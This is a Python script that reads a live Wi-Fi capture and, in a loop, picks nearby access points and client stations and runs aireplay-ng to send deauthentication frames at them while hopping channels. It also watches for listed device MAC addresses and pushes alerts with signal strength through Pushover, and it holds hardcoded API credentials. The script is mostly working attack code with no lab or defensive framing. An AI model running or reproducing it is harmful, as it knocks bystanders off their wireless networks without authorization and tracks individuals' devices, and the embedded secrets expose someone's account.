import os
import re
import csv
import time
import httplib, urllib
import glob
import sys

co = None
filename = ''

if len(sys.argv) > 1:
    filename = sys.argv[1]

if not filename:
    fileList = glob.glob('*.cap')
    filename = max(fileList, key=os.path.getctime)
    print(filename)

if not filename:
    print("couldn't find latest file, type it manually");
    quit()

#for f in glob.glob('/ram/*.cap'):
#    os.remove(f)

with open('allusednonrandomouis.txt', 'r') as o:
    ouis = set()
    allouis = o.readlines()
    for oui in allouis:
        ouis.add(oui.strip().upper())

with open(r'MACS', 'r') as m:
    reader = csv.reader(m)
    MACS = list(reader)

for line in MACS:
    line[2] = 0
    line[3] = 0

probes = 0
pcount = '1'
lastpcount = '0'
totalcount = 0
diff = 10
devices = set()
before = time.time()
FNULL = open(os.devnull, 'w')
ch = 1

with open(filename, 'rb') as header:
    head = header.read(24)

f = open(filename, 'rb')
first = True


def sender(mac, name, sa, da, db):
    conn = httplib.HTTPSConnection("api.pushover.net:443")
    conn.request("POST", "/1/messages.json",
                 urllib.urlencode({
                     "token": "aw5uyqzgeezbmqjf65g27h7saviyxx",
                     "user": "up81pubzck6vdog6zwsew4obx2x7rz",
                     "title": mac,
                     "message": '{} - {}/{}/{}'.format(name, sa, da, db),
                 }), {"Content-type": "application/x-www-form-urlencoded"})


def tsharkFail():
    for i in range(3):
        conn = httplib.HTTPSConnection("api.pushover.net:443")
        try:
            conn.request("POST", "/1/messages.json",
                         urllib.urlencode({
                             "token": "aw5uyqzgeezbmqjf65g27h7saviyxx",
                             "user": "up81pubzck6vdog6zwsew4obx2x7rz",
                             "title": 'Tshark stopped the capture!',
                             "message": '!!!',
                             "sound": 'falling',
                         }), {"Content-type": "application/x-www-form-urlencoded"})
            break
        except:
            print('failed to warn about Tshark');
            time.sleep(1)


while True:
    if int(pcount) != 0:
        # subprocess.call('editcap ' + filename + '.cap /ram/' + filename + '-outold.cap ' + '0-' + pcount, shell = True)
        content = f.read()
        with open('/' + filename + '-out.cap', 'wb') as sk:
            offset = len(content) - content.rfind(b'\x00\x00\x24\x00\x2F\x40\x00\xa0')
            # print(offset)
            if offset > 0 and content.rfind(b'\x00\x00\x24\x00\x2F\x40\x00\xa0') > 0:
                content = content[:-offset - 16]
                f.seek(f.tell() - offset - 16)
                # print(offset-16)
            if first:
                # print(f.tell())
                # print('first')
                sk.write(content)
            else:
                # print(f.tell())
                sk.write(head + content)
            # print(head)
        first = False
        pos = f.tell()
        # print('pos:' + str(pos))
        # print('lencontent:' + str(len(content)))

    if diff == 0:
        print('no more packets!')
        # tsharkFail()
        # time.sleep(10)


    p = os.popen("sudo tcpdump -q -r /" + filename + "-out.cap -e -t -N -n 2>/dev/null").read().upper()
    bssid = ''
    frames = 0
    # for frame in p.splitlines():
    #     if 'BSSID:' in frame and 'SA:' in frame and 'DA:' in frame and 'DBM' in frame and (
    #             'PROBE RE' not in frame) and ('DEAUTHENTICATION' not in frame) and ('ETHERTYPE' not in frame):
        # if len(frame) < 150 and 'BSSID:' in frame and 'SA:' in frame and 'DA:' in frame and 'DBM' in frame and ':76' in frame:
        #     print(frame)
    for frame in p.splitlines()[::-1]:
        if frames > 300:
            print('No good candidates for deauth in the last 100 frames')
            break
        frames += 1
        if 'BSSID:' in frame and 'SA:' in frame and 'DA:' in frame and 'DBM' in frame and ('PROBE RE' not in frame) and ('DEAUTHENTICATION' not in frame) and ('ETHERTYPE' not in frame):
            rebssid = re.search('BSSID:(..:..:..:..:..:..)', frame)
            resa = re.search('SA:(..:..:..:..:..:..)', frame)
            reda = re.search('DA:(..:..:..:..:..:..)', frame)
            resig = re.search('(-..)DBM', frame)
            try:
                bssid = rebssid.group(1)
                if bssid in ('FF:FF:FF:FF:FF:FF', '00:00:00:00:00:00'):
                    continue
                sa = resa.group(1)
                da = reda.group(1)
                sig = int(resig.group(1))
                print('signal is {} for {}'.format(sig, bssid))
                if sig < -80:
                    continue
                if bssid == sa:
                    station = da
                else:
                    station = sa
            except:
                print('error regex matching a bssid')
                continue
            if bssid and station != 'FF:FF:FF:FF:FF:FF':
                print('searched in {} frames for APs'.format(frames))
                print('deauthing AP {} with station {}'.format(bssid, station))
                d = os.popen("sudo aireplay-ng -a " + bssid + " -d " + station + " -D wlan1mon -0 8 2>/dev/null").read().upper()
                print(d)
                break
            else:
                print('No BSSID or station = FF:FF:FF:FF:FF:FF')
    #if ch == 6:
    #    ch = 11
    #elif ch == 11:
    #    ch = 1
    #else:
    #    ch = 6
    if ch == 11:
        ch = 1
    else:
        ch += 1
    os.popen('sudo iwconfig wlan1mon channel ' + str(ch))

    pcount = str(p.count('\n') + int(pcount))
    print(pcount)
    diff = int(pcount) - int(lastpcount)
    timediff = time.time() - before
    before = time.time()

    file = open('/index.html', 'w')
    print >> file, 'in', round(timediff, 2), 'seconds (', int(diff / timediff), 'p/s )'
    print >> file, (lastpcount + '-' + pcount)
    lastpcount = pcount
    probe = p.count('PROBE')# - p.count('DA:22:22:22:22')
    probes += probe
    print >> file, int(probe / timediff), 'probes/s', '(', probes * 100 / int(pcount), '% )'

    dcount = len(devices)
    dmentions = set(re.findall('A:(..:..:..:..:..:..)', p))
    if dmentions:
        for dmention in dmentions:
            if dmention[:8] in ouis:
                devices.add(dmention)
    print >> file, '{} devices\n'.format(len(devices))

    p = p.replace(' TA:', ' SA:')
    p = p.replace(' RA:', ' DA:')

    for mac in MACS:

        DA = str(p.count("DA:" + mac[0]))
        SA = str(p.count("SA:" + mac[0]))

        if SA == '0' and DA == '0':
            continue
        if SA != '0':
            co = re.search('(-..)DBM.*SA:' + mac[0], p)
        if co is None:
            db = ""
        else:
            db = co.group(1) + "dBm"

        mac[2] += int(SA)
        mac[3] += int(DA)
        bsend = time.time()

        with open('/notify', 'r') as n:
            notify = n.read()
        if '1' in notify:
            try:
                sender(mac[1], mac[0], SA, DA, db)
                print('sent a match to {} in {} seconds'.format(mac[1], time.time() - bsend))
            except:
                print('failed to send')
                continue
        # conn.getresponse()

    for line in MACS:
        if line[2] > 0 or line[3] > 0:
            print >> file, line[0:4]
    file.close()
    #time.sleep(1)
    print
    '\n',
